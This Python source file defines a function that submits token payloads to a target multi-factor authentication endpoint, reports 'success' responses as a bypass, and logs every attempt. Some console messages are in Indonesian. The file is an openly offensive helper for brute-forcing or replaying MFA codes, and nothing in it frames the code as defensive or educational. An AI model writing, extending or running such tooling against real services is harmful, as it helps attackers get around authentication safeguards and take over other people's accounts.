import requests
import logging
import os

# Ensure logs directory exists
os.makedirs('logs', exist_ok=True)

logging.basicConfig(filename='logs/results.log', level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

def bypass_mfa(url: str, payload: str) -> bool:
    """
    Attempt to bypass Multi-Factor Authentication.
    
    Args:
        url: Target MFA endpoint URL
        payload: MFA token payload
        
    Returns:
        bool: True if bypass successful, False otherwise
    """
    data = {"token": payload}
    try:
        logging.info(f"Attempting MFA bypass on {url}")
        response = requests.post(url, data=data, timeout=10)
        response.raise_for_status()
        
        if "success" in response.text.lower():
            logging.info(f"MFA bypass successful: {payload}")
            print(f"[+] Bypass MFA berhasil: {payload}")
            return True
        else:
            logging.info(f"MFA bypass failed for {url}")
            print(f"[-] Bypass MFA gagal")
            return False
            
    except requests.exceptions.Timeout:
        logging.error(f"Timeout during MFA bypass on {url}")
        print(f"[!] Timeout: {url}")
        return False
    except requests.exceptions.RequestException as e:
        logging.error(f"Request error during MFA bypass: {e}")
        print(f"[!] Request Error: {e}")
        return False
    except Exception as e:
        logging.error(f"Unexpected error during MFA bypass: {e}")
        print(f"[!] Unexpected Error: {e}")
        return False